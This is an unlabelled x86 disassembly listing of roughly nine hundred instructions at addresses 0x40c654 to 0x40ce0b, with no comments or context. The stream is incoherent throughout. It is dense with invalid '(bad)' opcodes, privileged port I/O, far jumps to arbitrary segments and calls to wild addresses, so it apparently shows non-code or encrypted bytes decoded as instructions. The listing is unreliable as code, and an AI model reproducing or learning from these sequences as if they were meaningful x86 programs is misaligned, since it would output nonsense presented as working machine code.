  40c654:	fnstcw WORD PTR [esi-0x2b2e0d0e]
  40c65a:	mov    cl,0xd4
  40c65c:	lods   al,BYTE PTR ds:[esi]
  40c65d:	xlat   BYTE PTR ds:[ebx]
  40c65e:	call   0xe916b55b
  40c663:	mul    dl
  40c665:	lock int3 
  40c667:	rol    al,cl
  40c669:	(bad)  
  40c66a:	icebp  
  40c66b:	add    cl,BYTE PTR [ecx]
  40c66d:	add    al,0xf7
  40c66f:	out    0xc0,al
  40c671:	loop   0x40c63f
  40c673:	fsub   st,st(3)
  40c675:	out    dx,al
  40c676:	ret    0xccf2
  40c679:	hlt    
  40c67a:	fdivr  st(1),st
  40c67c:	shl    BYTE PTR [eax-0x2e071a1a],0xf7
  40c683:	add    dh,bl
  40c685:	(bad)  
  40c686:	sti    
  40c687:	ret    
  40c688:	fadd   DWORD PTR [eax]
  40c68a:	rol    DWORD PTR [edi],1
  40c68c:	jmp    0x10d:0xfb0ac8dd
  40c693:	or     ah,bl
  40c695:	in     eax,0xee
  40c697:	leave  
  40c698:	aad    0xcc
  40c69a:	in     eax,dx
  40c69b:	call   0xf2efa796
  40c6a0:	in     eax,dx
  40c6a1:	aad    0xe3
  40c6a3:	shl    bl,cl
  40c6a5:	clc    
  40c6a6:	call   0xe036ba8b
  40c6ab:	fld    st(2)
  40c6ad:	add    al,BYTE PTR ds:0xcdeefcb
  40c6b3:	leave  
  40c6b4:	icebp  
  40c6b5:	repz fild QWORD PTR [ecx-0x141d351e]
  40c6bc:	mov    dh,0xb5
  40c6be:	jmp    0xfad4:0xd2d3f6b9
  40c6c5:	mov    esi,0xcccee001
  40c6ca:	aad    0xf1
  40c6cc:	test   DWORD PTR [ecx],0xfcfdff04
  40c6d2:	or     ebp,ebp
  40c6d4:	in     eax,0xdc
  40c6d6:	ror    esi,1
  40c6d8:	ror    edi,0xd0
  40c6db:	mov    ah,0xf1
  40c6dd:	stc    
  40c6de:	repz enter 0xb8d3,0xfc
  40c6e3:	test   dl,0xe8
  40c6e6:	icebp  
  40c6e7:	ror    ebp,cl
  40c6e9:	inc    dh
  40c6eb:	mov    esp,0x7ca05d9
  40c6f0:	enter  0xb0b,0xc1
  40c6f4:	retf   
  40c6f5:	mov    esi,0xe2ebbddc
  40c6fa:	retf   
  40c6fb:	mov    dl,0xe9
  40c6fd:	mov    bl,0xe6
  40c6ff:	clc    
  40c700:	mov    eax,0xbfede3db
  40c705:	add    BYTE PTR [edi],al
  40c707:	add    DWORD PTR [esp+esi*8-0x1472428],edi
  40c70e:	(bad)  
  40c70f:	cli    
  40c710:	frndint 
  40c712:	jmp    0xbfe9a7f1
  40c717:	scas   eax,DWORD PTR es:[edi]
  40c718:	scas   al,BYTE PTR es:[edi]
  40c719:	(bad)  
  40c71a:	scas   al,BYTE PTR es:[edi]
  40c71b:	int    0xc1
  40c71d:	mov    dl,0xd9
  40c71f:	int    0xc5
  40c721:	shl    BYTE PTR [ebp+0x2f1fdd5],cl
  40c727:	jmp    edi
  40c729:	ret    0xd004
  40c72c:	mov    esp,0xcef4fff1
  40c731:	out    0xc5,eax
  40c733:	ror    edi,0xd2
  40c736:	jecxz  0x40c6e7
  40c738:	in     eax,dx
  40c739:	lock mov dh,0xe4
  40c73c:	mov    ah,0xd4
  40c73e:	mov    dl,0xee
  40c740:	mov    edi,0xb4bff4be
  40c745:	int3   
  40c746:	std    
  40c747:	mov    ecx,0xf4ebd7f1
  40c74c:	out    0xe0,al
  40c74e:	jecxz  0x40c710
  40c750:	(bad)  
  40c751:	int    0xc9
  40c753:	(bad)  
  40c755:	test   eax,0xcab0cbf0
  40c75a:	int3   
  40c75b:	out    dx,eax
  40c75c:	retf   
  40c75d:	in     eax,dx
  40c75e:	in     al,0xed
  40c760:	in     eax,0xc9
  40c762:	repnz cmc 
  40c764:	(bad)  
  40c766:	out    0xc0,eax
  40c768:	std    
  40c769:	mov    ebx,0xde0ad807
  40c76e:	(bad)  
  40c76f:	in     al,0xfa
  40c771:	jecxz  0x40c73c
  40c773:	fsubp  st(4),st
  40c775:	shr    edx,cl
  40c777:	repnz loope 0x40c73f
  40c77a:	mov    dh,0xc4
  40c77c:	mov    ch,0xc4
  40c77e:	rcl    bh,0xd6
  40c781:	(bad)  
  40c783:	in     eax,dx
  40c784:	add    edi,edi
  40c786:	fyl2xp1 
  40c788:	out    0xd8,eax
  40c78a:	int3   
  40c78b:	pop    es
  40c78c:	shr    eax,0xe1
  40c78f:	in     eax,0xfd
  40c791:	cmc    
  40c792:	fmul   DWORD PTR [eax]
  40c794:	xsave  [esi-0x15324c30]
  40c79b:	in     al,dx
  40c79c:	shl    DWORD PTR [esi-0x15100417],cl
  40c7a2:	fstp   st(3)
  40c7a4:	xlat   BYTE PTR ds:[ebx]
  40c7a5:	icebp  
  40c7a6:	mov    esi,0xf3f7e7ff
  40c7ab:	mov    esp,0xe7e4dfdb
  40c7b0:	add    ecx,DWORD PTR [edx]
  40c7b2:	or     eax,ebp
  40c7b4:	(bad)  
  40c7b5:	scas   al,BYTE PTR es:[edi]
  40c7b6:	repnz lods eax,DWORD PTR ds:[esi]
  40c7b8:	cmc    
  40c7b9:	aam    0xb0
  40c7bb:	ret    0xb7b1
  40c7be:	mov    al,0xef
  40c7c0:	(bad)  
  40c7c2:	rcr    ecx,1
  40c7c4:	jecxz  0x40c7af
  40c7c6:	mov    eax,0xf8c6f2c3
  40c7cb:	mov    esp,0xe5fed0c5
  40c7d0:	fxtract 
  40c7d2:	out    dx,eax
  40c7d3:	in     al,dx
  40c7d4:	fsubr  st(5),st
  40c7d6:	out    dx,al
  40c7d7:	mov    bh,0xd2
  40c7d9:	iret   
  40c7da:	int3   
  40c7db:	ret    0xafd1
  40c7de:	icebp  
  40c7df:	mov    edi,0xf9d1f3d0
  40c7e4:	loop   0x40c7c4
  40c7e6:	out    0xfe,eax
  40c7e8:	icebp  
  40c7e9:	hlt    
  40c7ea:	out    0xbd,al
  40c7ec:	test   BYTE PTR [eax],0xc8
  40c7ef:	loope  0x40c7c0
  40c7f1:	fsqrt  
  40c7f3:	or     al,BYTE PTR [edi]
  40c7f5:	scas   eax,DWORD PTR es:[edi]
  40c7f6:	ret    
  40c7f7:	scas   eax,DWORD PTR es:[edi]
  40c7f8:	iret   
  40c7f9:	ret    
  40c7fa:	lods   eax,DWORD PTR ds:[esi]
  40c7fb:	mov    bl,0xc6
  40c7fd:	aam    0xf6
  40c7ff:	(bad)  
  40c800:	aam    0xf5
  40c802:	(bad)  
  40c804:	cld    
  40c805:	mul    edx
  40c807:	add    bh,bh
  40c809:	fcmovnbe st,st(4)
  40c80b:	add    al,dl
  40c80d:	(bad)  
  40c80f:	call   0xf950c2da
  40c814:	cld    
  40c815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c816:	int    0xbf
  40c818:	(bad)  
  40c819:	mov    esp,0xd8e1eeaa
  40c81e:	aam    0xea
  40c820:	(bad)  
  40c821:	cli    
  40c822:	leave  
  40c823:	mov    ecx,0x1e7d3f4
  40c828:	out    dx,al
  40c829:	fcmovnu st,st(5)
  40c82b:	retf   
  40c82c:	fdivp  st(0),st
  40c82e:	std    
  40c82f:	out    0xfc,al
  40c831:	cmc    
  40c832:	cli    
  40c833:	or     DWORD PTR ds:0xddd6d3f3,ecx
  40c839:	mov    ch,0xc3
  40c83b:	jmp    0xd32a9425
  40c840:	rcl    al,cl
  40c842:	retf   0xf2ea
  40c845:	add    ecx,edx
  40c847:	fucomip st,st(5)
  40c849:	aad    0xc5
  40c84b:	or     al,BYTE PTR [ebx]
  40c84d:	(bad)  
  40c84e:	fcomp  st(2)
  40c850:	iret   
  40c851:	add    eax,DWORD PTR [ebx]
  40c853:	adc    ecx,DWORD PTR [eax+ecx*8]
  40c856:	out    0xcb,al
  40c858:	out    0xd6,al
  40c85a:	sti    
  40c85b:	loopne 0x40c822
  40c85d:	aad    0xdf
  40c85f:	sar    esi,1
  40c861:	retf   0xf0d3
  40c864:	fnstsw WORD PTR [esi+edi*4-0x451e0bff]
  40c86b:	mov    esp,0xe9cbe8de
  40c870:	hlt    
  40c871:	cli    
  40c872:	or     bh,dl
  40c874:	in     al,0xe5
  40c876:	shl    edi,cl
  40c878:	ret    0xc4ca
  40c87b:	fcmovbe st,st(6)
  40c87d:	div    BYTE PTR [ebp-0xd440d33]
  40c883:	clc    
  40c884:	mov    al,0xfe
  40c886:	not    dh
  40c888:	repnz mov esi,0x2eb07f2
  40c88e:	retf   
  40c88f:	clc    
  40c890:	loop   0x40c858
  40c892:	(bad)  
  40c894:	pop    es
  40c895:	bnd call 0xee02ab5f
  40c89b:	mov    al,0xdb
  40c89d:	out    dx,eax
  40c89e:	repnz mov dh,0xf6
  40c8a1:	mul    ebx
  40c8a3:	fucomip st,st(2)
  40c8a5:	cli    
  40c8a6:	cmc    
  40c8a7:	in     al,dx
  40c8a8:	loop   0x40c87b
  40c8aa:	(bad)  
  40c8ab:	loope  0x40c878
  40c8ad:	cmc    
  40c8ae:	add    cl,ah
  40c8b0:	fcompp 
  40c8b2:	adc    ebx,esp
  40c8b4:	fmul   st,st(1)
  40c8b6:	mov    al,0xae
  40c8b8:	mov    bl,0xe5
  40c8ba:	mov    bl,0xc3
  40c8bc:	icebp  
  40c8bd:	repz mov ecx,0xeef2fede
  40c8c3:	mov    cl,0xb8
  40c8c5:	add    esi,ebx
  40c8c7:	rcl    ecx,cl
  40c8c9:	add    eax,0x5cbf5e2
  40c8ce:	or     DWORD PTR [ebx],eax
  40c8d0:	(bad)  
  40c8d1:	aam    0x8
  40c8d3:	adc    ch,bh
  40c8d5:	(bad)
  40c8d8:	lock in al,dx
  40c8da:	loop   0x40c8ac
  40c8dc:	test   al,0xf8
  40c8de:	mov    dl,0xeb
  40c8e0:	mov    ah,0xd9
  40c8e2:	in     al,0xd8
  40c8e4:	fstp   TBYTE PTR [ebp+0x2c0dbf8]
  40c8ea:	sti    
  40c8eb:	rol    DWORD PTR [ecx],cl
  40c8ed:	add    al,cl
  40c8ef:	add    ah,bh
  40c8f1:	int    0xfa
  40c8f3:	or     cl,BYTE PTR [ecx]
  40c8f5:	into   
  40c8f6:	out    dx,al
  40c8f7:	iret   
  40c8f8:	repz call 0xce2d9aaf
  40c8fe:	out    0xdf,al
  40c900:	std    
  40c901:	retf   
  40c902:	imul   ebx
  40c904:	fmul   st,st(0)
  40c906:	loop   0x40c8f7
  40c908:	loope  0x40c8eb
  40c90a:	add    eax,0xdb04e1c2
  40c90f:	jmp    0x40c8f0
  40c911:	aam    0xd
  40c913:	fstp   st(6)
  40c915:	enter  0xf2f7,0xea
  40c919:	cmc    
  40c91a:	repz aam 0xf4
  40c91d:	jmp    0xd2cb:0xc5c6efca
  40c924:	aad    0xbf
  40c926:	clc    
  40c927:	not    bl
  40c929:	stc    
  40c92a:	stc    
  40c92b:	repz out 0x7,eax
  40c92e:	loopne 0x40c92f
  40c930:	in     eax,dx
  40c931:	out    dx,eax
  40c932:	fiadd  DWORD PTR [eax]
  40c934:	shl    ecx,cl
  40c936:	in     al,dx
  40c937:	(bad)  
  40c938:	mov    ebp,0xeec8e2c1
  40c93d:	out    0xfa,eax
  40c93f:	fdiv   st,st(2)
  40c941:	jmp    0xfbf2:0xedf0c3bd
  40c948:	mov    esi,0xd8c4f7f9
  40c94d:	cld    
  40c94e:	fstp   st(2)
  40c950:	(bad)  
  40c951:	int    0xe1
  40c953:	or     dl,dl
  40c955:	fnstcw WORD PTR [edi-0xe0b122e]
  40c95b:	repnz leave 
  40c95d:	enter  0xd4bb,0xdb
  40c961:	in     eax,dx
  40c962:	aad    0xcc
  40c964:	aam    0xe8
  40c966:	add    eax,edi
  40c968:	mov    esi,0xb8f8e7f5
  40c96d:	sar    ecx,1
  40c96f:	out    0xcb,eax
  40c971:	ret    
  40c972:	hlt    
  40c973:	pop    es
  40c974:	leave  
  40c975:	retf   0xf0d3
  40c978:	(bad)  
  40c979:	fmul   st(7),st
  40c97b:	in     al,dx
  40c97c:	out    dx,al
  40c97d:	mov    dh,0xdb
  40c97f:	repz ror eax,1
  40c982:	jmp    0x40c980
  40c984:	sti    
  40c985:	loope  0x40c968
  40c987:	(bad)  
  40c989:	sar    esp,0xc0
  40c98c:	cmc    
  40c98d:	or     eax,esp
  40c98f:	push   cs
  40c990:	out    dx,eax
  40c991:	in     al,0xe6
  40c993:	or     dl,ah
  40c995:	lock lods al,BYTE PTR ds:[esi]
  40c997:	out    dx,eax
  40c998:	aad    0xe2
  40c99a:	fcmovnbe st,st(6)
  40c99c:	out    dx,eax
  40c99d:	into   
  40c99e:	fxch   st(5)
  40c9a0:	fcos   
  40c9a2:	int    0xef
  40c9a4:	loop   0x40c9a0
  40c9a6:	cli    
  40c9a7:	mov    ch,0xe3
  40c9a9:	lock cld 
  40c9ab:	stc    
  40c9ac:	stc    
  40c9ad:	hlt    
  40c9ae:	in     al,0xdc
  40c9b0:	(bad)  
  40c9b1:	jmp    0xe6ec:0xce0e0807
  40c9b8:	rol    edi,1
  40c9ba:	jmp    0x40c982
  40c9bc:	test   al,0xd0
  40c9be:	mov    dl,0xf0
  40c9c0:	sti    
  40c9c1:	int    0xcb
  40c9c3:	div    bl
  40c9c5:	in     eax,dx
  40c9c6:	rol    DWORD PTR [ecx],cl
  40c9c8:	add    dh,ch
  40c9ca:	fld    QWORD PTR [ebx]
  40c9cc:	std    
  40c9cd:	add    eax,0xdedcfbd9
  40c9d2:	retf   0xae6
  40c9d5:	out    0xe6,al
  40c9d7:	(bad)  
  40c9d8:	jmp    0xd504b79a
  40c9dd:	fld1   
  40c9df:	int3   
  40c9e0:	enter  0xcbff,0xba
  40c9e4:	repz mov esp,0xfff3fbe2
  40c9ea:	xlat   BYTE PTR ds:[ebx]
  40c9eb:	fdiv   st,st(2)
  40c9ed:	fdivrp st(0),st
  40c9ef:	out    dx,eax
  40c9f0:	leave  
  40c9f1:	or     esp,ecx
  40c9f3:	fcmovnu st,st(0)
  40c9f5:	fisubr WORD PTR [eax-0x10361010]
  40c9fb:	shl    esp,0xb9
  40c9fe:	(bad)  
  40ca00:	stc    
  40ca01:	(bad)  
  40ca02:	in     eax,dx
  40ca03:	aam    0xc3
  40ca05:	sti    
  40ca06:	div    ah
  40ca08:	mov    ah,0xd2
  40ca0a:	or     eax,DWORD PTR [eax]
  40ca0c:	sti    
  40ca0d:	fmul   QWORD PTR [edi]
  40ca0f:	cmc    
  40ca10:	out    dx,eax
  40ca11:	(bad)  
  40ca13:	adc    esi,ecx
  40ca15:	loop   0x40ca06
  40ca17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca18:	scas   eax,DWORD PTR es:[edi]
  40ca19:	iret   
  40ca1a:	(bad)
  40ca1d:	leave  
  40ca1e:	stc    
  40ca1f:	mov    cl,0xe9
  40ca21:	lds    esi,FWORD PTR [ebp-0x25230107]
  40ca27:	add    DWORD PTR [edi-0x16f81efd],edi
  40ca2d:	jmp    ebp
  40ca2f:	(bad)  
  40ca30:	fxch   st(0)
  40ca32:	or     al,0xe9
  40ca34:	in     eax,dx
  40ca35:	mov    esi,0xe7b2cfac
  40ca3a:	iret   
  40ca3b:	rol    cl,1
  40ca3d:	into   
  40ca3e:	out    0xcc,al
  40ca40:	(bad)  
  40ca41:	in     al,dx
  40ca42:	mov    ebp,0xffbdd703
  40ca47:	add    edx,esp
  40ca49:	fadd   QWORD PTR [ebx]
  40ca4b:	(bad)  
  40ca4c:	cli    
  40ca4d:	jmp    0xec36ce27
  40ca52:	loop   0x40ca15
  40ca54:	pop    es
  40ca55:	(bad)  
  40ca56:	int    0xf6
  40ca58:	out    0xd7,eax
  40ca5a:	xlat   BYTE PTR ds:[ebx]
  40ca5b:	out    dx,eax
  40ca5c:	rol    esp,cl
  40ca5e:	call   0xd712803a
  40ca63:	mov    ebp,0xd1fed1b0
  40ca68:	rcr    dl,cl
  40ca6a:	(bad)  
  40ca6b:	cmc    
  40ca6c:	loopne 0x40ca51
  40ca6e:	shl    dh,1
  40ca70:	add    eax,0xcb0eeddb
  40ca75:	(bad)  
  40ca76:	jmp    0xcbb4:0xd4f3e5b7
  40ca7d:	mov    edx,0xd7b5c5ce
  40ca82:	sar    cl,cl
  40ca84:	mov    esp,0xd4d1f7f2
  40ca89:	idiv   esp
  40ca8b:	rol    esi,1
  40ca8d:	aad    0x8
  40ca8f:	jmp    0xc4ce:0xa00e20b
  40ca96:	leave  
  40ca97:	xlat   BYTE PTR ds:[ebx]
  40ca98:	(bad)  
  40ca99:	int    0xc3
  40ca9b:	aam    0xcb
  40ca9d:	repnz out 0xba,al
  40caa0:	fcmove st,st(3)
  40caa2:	in     al,dx
  40caa3:	hlt    
  40caa4:	mov    esp,0xd107ecd7
  40caa9:	xlat   BYTE PTR ds:[ebx]
  40caaa:	mov    esi,0xd8d5c3fd
  40caaf:	(bad)  
  40cab0:	dec    BYTE PTR [ebx+eax*1]
  40cab3:	repnz cld 
  40cab5:	in     eax,0xae
  40cab7:	mov    cl,0xce
  40cab9:	mov    dh,0xc2
  40cabb:	aad    0xb2
  40cabd:	fdiv   DWORD PTR [esi-0x50a3712]
  40cac3:	stc    
  40cac4:	repz rol eax,0xda
  40cac8:	rol    esi,0xf3
  40cacb:	out    0xd2,eax
  40cacd:	(bad)
  40cad0:	out    0xfc,eax
  40cad2:	fucompp 
  40cad4:	(bad)  
  40cad5:	mov    edi,0xe2d0c4cf
  40cada:	lock mov dh,0xec
  40cadd:	repz shl bh,1
  40cae0:	fld    st(4)
  40cae2:	icebp  
  40cae3:	fdivrp st(0),st
  40cae5:	mov    eax,0xfee1fa03
  40caea:	std    
  40caeb:	rcl    cl,1
  40caed:	out    0x7,eax
  40caef:	fimul  WORD PTR [edx]
  40caf1:	std    
  40caf2:	repz (bad) 
  40caf4:	clc    
  40caf5:	iret   
  40caf6:	(bad)
  40cafa:	(bad)
  40cafd:	mov    cl,0xc7
  40caff:	fidivr DWORD PTR [edx-0x2e290923]
  40cb05:	add    dh,al
  40cb07:	loope  0x40cadd
  40cb09:	rol    DWORD PTR [ebx],1
  40cb0b:	jecxz  0x40caf0
  40cb0d:	jecxz  0x40cb09
  40cb0f:	add    al,0xe1
  40cb11:	fcmove st,st(1)
  40cb13:	cld    
  40cb14:	por    mm0,mm5
  40cb17:	test   al,0xeb
  40cb19:	mov    dh,0xdc
  40cb1b:	loop   0x40caeb
  40cb1d:	mov    dl,0xd7
  40cb1f:	jmp    0xd9f5:0xf1ebb4da
  40cb26:	fmulp  st(5),st
  40cb28:	repnz int 0xba
  40cb2b:	loope  0x40cb1d
  40cb2d:	add    al,0xf6
  40cb2f:	call   0xc546b13f
  40cb34:	fnstsw WORD PTR [esp+ebp*4-0x3f395735]
  40cb3b:	bnd jmp 0xb619be17
  40cb41:	enter  0xd4bf,0x2
  40cb45:	rcl    ah,cl
  40cb47:	iret   
  40cb48:	mov    ebp,0xb8fb06dc
  40cb4d:	xlat   BYTE PTR ds:[ebx]
  40cb4e:	(bad)  
  40cb4f:	retf   0xcce
  40cb52:	sti    
  40cb53:	cli    
  40cb54:	jmp    0xf6e6:0xdcdcbdaa
  40cb5b:	into   
  40cb5c:	jmp    0xd9f4:0xf3d6dff1
  40cb63:	out    dx,eax
  40cb64:	fnstsw WORD PTR [ebx-0x430f120b]
  40cb6a:	pop    es
  40cb6b:	mov    ecx,0x6c7060a
  40cb70:	add    eax,0xdc08fbd5
  40cb75:	int3   
  40cb76:	int3   
  40cb77:	lods   al,BYTE PTR ds:[esi]
  40cb78:	(bad)  
  40cb79:	leave  
  40cb7a:	out    dx,eax
  40cb7b:	fidiv  DWORD PTR [ebp-0x100a1125]
  40cb81:	repz iret 
  40cb83:	(bad)  
  40cb84:	mov    esi,0xbe01c1e1
  40cb89:	(bad)  
  40cb8a:	(bad)  
  40cb8c:	aam    0xc1
  40cb8e:	(bad)  
  40cb90:	leave  
  40cb91:	call   0xd232d0a3
  40cb96:	loopne 0x40cb76
  40cb98:	shl    esp,cl
  40cb9a:	div    BYTE PTR [edi-0x2438304e]
  40cba0:	fstp   TBYTE PTR [eax-0x31450610]
  40cba6:	jecxz  0x40cbae
  40cba8:	out    dx,al
  40cba9:	mov    ebx,0xe809d9e2
  40cbae:	(bad)  
  40cbaf:	stc    
  40cbb0:	jmp    0xf3d2:0x111201fe
  40cbb7:	rol    cl,cl
  40cbb9:	call   0xe6f7ae6c
  40cbbe:	out    dx,al
  40cbbf:	fcmovu st,st(1)
  40cbc1:	call   0xdb42cfbd
  40cbc6:	add    ebp,esp
  40cbc8:	sar    al,0xc2
  40cbcb:	cli    
  40cbcc:	in     al,0xe2
  40cbce:	xlat   BYTE PTR ds:[ebx]
  40cbcf:	add    eax,eax
  40cbd1:	clc    
  40cbd2:	ffreep st(1)
  40cbd4:	clc    
  40cbd5:	rol    dh,1
  40cbd7:	xlat   BYTE PTR ds:[ebx]
  40cbd8:	(bad)
  40cbdb:	out    dx,eax
  40cbdc:	xlat   BYTE PTR ds:[ebx]
  40cbdd:	int3   
  40cbde:	mov    edx,0xbfcfb9ec
  40cbe3:	fnstsw WORD PTR [edi-0x242c2f41]
  40cbe9:	ret    0x5e1
  40cbec:	aam    0xfa
  40cbee:	jmp    0xd43c4d5
  40cbf3:	add    ebx,esi
  40cbf5:	fsubr  QWORD PTR [eax-0x4c0e1951]
  40cbfb:	xlat   BYTE PTR ds:[ebx]
  40cbfc:	shr    cl,1
  40cbfe:	retf   
  40cbff:	sti    
  40cc00:	repz retf 
  40cc02:	stc    
  40cc03:	(bad)  
  40cc05:	loop   0x40cbe5
  40cc07:	out    dx,eax
  40cc08:	(bad)  
  40cc0a:	(bad)  
  40cc0c:	(bad)  
  40cc0e:	clc    
  40cc0f:	or     cl,bh
  40cc11:	or     al,0xea
  40cc13:	loope  0x40cc07
  40cc15:	out    0xb8,eax
  40cc17:	mov    ebp,0xb2d0bcd2
  40cc1c:	in     al,0xe6
  40cc1e:	clc    
  40cc1f:	rol    ch,cl
  40cc21:	fcompp 
  40cc23:	aam    0xd2
  40cc25:	inc    DWORD PTR [edi]
  40cc27:	loopne 0x40cbe8
  40cc29:	loopne 0x40cc10
  40cc2b:	add    BYTE PTR [edx],al
  40cc2d:	jmp    0x40cc24
  40cc2f:	fucomip st,st(6)
  40cc31:	(bad)  
  40cc32:	(bad)  
  40cc34:	into   
  40cc35:	(bad)  
  40cc36:	icebp  
  40cc37:	jecxz  0x40cbf0
  40cc39:	fsub   st(1),st
  40cc3b:	call   0xe5148cf7
  40cc40:	repz icebp 
  40cc42:	(bad)  
  40cc44:	mov    esp,0xe5f607fa
  40cc49:	(bad)  
  40cc4a:	icebp  
  40cc4b:	loope  0x40cc13
  40cc4d:	cld    
  40cc4e:	inc    BYTE PTR [edx]
  40cc50:	(bad)  
  40cc51:	call   0xbd54c532
  40cc56:	loop   0x40cc21
  40cc58:	scas   al,BYTE PTR es:[edi]
  40cc59:	scas   al,BYTE PTR es:[edi]
  40cc5a:	icebp  
  40cc5b:	in     al,0xb3
  40cc5d:	leave  
  40cc5e:	enter  0xd2c8,0xb6
  40cc62:	out    dx,eax
  40cc63:	aad    0xbc
  40cc65:	shl    dl,cl
  40cc67:	mov    eax,0xdad40701
  40cc6c:	ret    
  40cc6d:	loopne 0x40cc73
  40cc6f:	dec    DWORD PTR [eax]
  40cc71:	(bad)  
  40cc73:	in     al,dx
  40cc74:	(bad)  
  40cc75:	call   0xc709af3d
  40cc7a:	mov    esp,0xdbcab0db
  40cc7f:	imul   esi
  40cc81:	fidivr WORD PTR [edi+edi*8-0x42373022]
  40cc88:	mov    eax,0xfef8f8c1
  40cc8d:	jecxz  0x40cc5f
  40cc8f:	in     al,0xe9
  40cc91:	call   0xb33294a3
  40cc96:	into   
  40cc97:	(bad)
  40cc9b:	retf   
  40cc9c:	out    0xd4,al
  40cc9e:	jmp    0xd425a56a
  40cca3:	loop   0x40cc99
  40cca5:	out    dx,eax
  40cca6:	cld    
  40cca7:	add    eax,ebx
  40cca9:	inc    edi
  40ccab:	retf   
  40ccac:	sti    
  40ccad:	clc    
  40ccae:	jecxz  0x40cc85
  40ccb0:	add    eax,0xf1efcfed
  40ccb5:	sar    BYTE PTR [ebp-0x3d160d38],cl
  40ccbb:	rcr    ecx,cl
  40ccbd:	out    0xb2,eax
  40ccbf:	shl    ebp,cl
  40ccc1:	(bad)  
  40ccc2:	enter  0xf9cb,0xe2
  40ccc6:	fcmovu st,st(2)
  40ccc8:	mov    ebp,0xdcc6fde2
  40cccd:	jmp    0x40ccb9
  40cccf:	test   BYTE PTR [edx],0xc5
  40ccd2:	out    dx,al
  40ccd3:	jmp    0xc8c9:0xf6aec3e8
  40ccda:	lods   eax,DWORD PTR ds:[esi]
  40ccdb:	(bad)  
  40ccdc:	mov    edx,0xf5edefd2
  40cce1:	clc    
  40cce2:	in     al,dx
  40cce3:	aad    0xe9
  40cce5:	mov    eax,0xd7f1ccda
  40ccea:	fimul  WORD PTR [ebx]
  40ccec:	sar    DWORD PTR [edi-0xbf229fd],0xde
  40ccf3:	fmul   st(3),st
  40ccf5:	lock mov dl,0xee
  40ccf8:	(bad)  
  40ccf9:	ror    ah,0xc6
  40ccfc:	icebp  
  40ccfd:	shl    al,0xd8
  40cd00:	(bad)  
  40cd02:	std    
  40cd03:	mov    ah,0xcd
  40cd05:	iret   
  40cd06:	out    dx,al
  40cd07:	lock (bad) 
  40cd09:	fdiv   st(7),st
  40cd0b:	std    
  40cd0c:	mov    DWORD PTR [eax],0x2f4c506
  40cd12:	or     ebx,edi
  40cd14:	push   es
  40cd15:	jmp    0x40ccf8
  40cd17:	int3   
  40cd18:	out    dx,al
  40cd19:	aad    0xd5
  40cd1b:	fcmovnbe st,st(7)
  40cd1d:	in     al,dx
  40cd1e:	mov    bh,0xb6
  40cd20:	fdivr  st,st(7)
  40cd22:	mov    eax,0xf5dcdefe
  40cd27:	(bad)  
  40cd28:	fcomp  st(4)
  40cd2a:	ret    
  40cd2b:	cmc    
  40cd2c:	ret    
  40cd2d:	shl    al,1
  40cd2f:	imul   esi
  40cd31:	fisttp DWORD PTR [esi]
  40cd33:	fcmovb st,st(0)
  40cd35:	(bad)  
  40cd37:	loope  0x40cd0c
  40cd39:	cmc    
  40cd3a:	jmp    0xfad9:0xc6f2caec
  40cd41:	xlat   BYTE PTR ds:[ebx]
  40cd42:	stc    
  40cd43:	clc    
  40cd44:	fidiv  WORD PTR [edi-0xf413c3d]
  40cd4a:	aam    0xd8
  40cd4c:	mov    BYTE PTR ds:0xda08dee5,0xd
  40cd53:	push   es
  40cd54:	cli    
  40cd55:	lods   al,BYTE PTR ds:[esi]
  40cd56:	scas   eax,DWORD PTR es:[edi]
  40cd57:	(bad)  
  40cd58:	xlat   BYTE PTR ds:[ebx]
  40cd59:	stos   DWORD PTR es:[edi],eax
  40cd5a:	(bad)  
  40cd5b:	mov    dl,0xd3
  40cd5d:	retf   0xd4b5
  40cd60:	fcmovb st,st(4)
  40cd62:	std    
  40cd63:	mov    esp,0xe1d5f1de
  40cd68:	icebp  
  40cd69:	fistp  QWORD PTR [esi-0x371c3bfd]
  40cd6f:	loop   0x40cd71
  40cd71:	in     al,dx
  40cd72:	ffree  st(5)
  40cd74:	shr    DWORD PTR [edi-0x154e3a18],cl
  40cd7a:	cmc    
  40cd7b:	icebp  
  40cd7c:	mov    ah,0xf3
  40cd7e:	mov    dh,0xf7
  40cd80:	(bad)  
  40cd81:	fistp  QWORD PTR [ebx-0x3460c16]
  40cd87:	fcmovnu st,st(5)
  40cd89:	in     eax,dx
  40cd8a:	jmp    0x40cd50
  40cd8c:	(bad)
  40cd8f:	out    dx,eax
  40cd90:	retf   0x6ec
  40cd93:	jmp    0x40cd5e
  40cd95:	in     al,dx
  40cd96:	out    dx,eax
  40cd97:	out    0xe4,al
  40cd99:	out    dx,al
  40cd9a:	retf   0xf3ac
  40cd9d:	(bad)  
  40cd9e:	int3   
  40cd9f:	lock int3 
  40cda1:	retf   
  40cda2:	mov    ebp,0xe1d5b8eb
  40cda7:	(bad)  
  40cda8:	(bad)  
  40cda9:	fisttp DWORD PTR [ebx]
  40cdab:	(bad)  
  40cdac:	in     eax,0xe0
  40cdae:	cli    
  40cdaf:	(bad)
  40cdb2:	std    
  40cdb3:	out    dx,eax
  40cdb4:	icebp  
  40cdb5:	out    0xc7,al
  40cdb7:	(bad)  
  40cdb8:	jmp    0x40cd6d
  40cdba:	mov    ch,0xf6
  40cdbc:	xlat   BYTE PTR ds:[ebx]
  40cdbd:	aam    0xd3
  40cdbf:	in     al,dx
  40cdc0:	aad    0xb6
  40cdc2:	ffreep st(3)
  40cdc4:	mov    edx,0xd201dbec
  40cdc9:	(bad)  
  40cdca:	sti    
  40cdcb:	mov    ecx,0xbf4c5e7
  40cdd0:	add    eax,0xe6c8cdfc
  40cdd5:	mov    edi,0xf3c5d3dd
  40cdda:	xlat   BYTE PTR ds:[ebx]
  40cddb:	shl    ebx,cl
  40cddd:	loopne 0x40cdaf
  40cddf:	(bad)  
  40cde1:	in     al,dx
  40cde2:	(bad)  
  40cde3:	(bad)  
  40cde4:	stc    
  40cde5:	iret   
  40cde6:	sar    BYTE PTR [ebp+ecx*8-0x392e19fc],cl
  40cded:	in     eax,0xde
  40cdef:	loop   0x40cde0
  40cdf1:	out    dx,eax
  40cdf2:	retf   
  40cdf3:	iret   
  40cdf4:	int    0xea
  40cdf6:	shl    edx,cl
  40cdf8:	in     al,dx
  40cdf9:	repz shl esp,0xf3
  40cdfd:	jmp    0xd5ed:0xd9f2d5bb
  40ce04:	fsubrp st(2),st
  40ce06:	rcl    esp,0xf5
  40ce09:	add    eax,eax
  40ce0b:	add    ebp,ecx
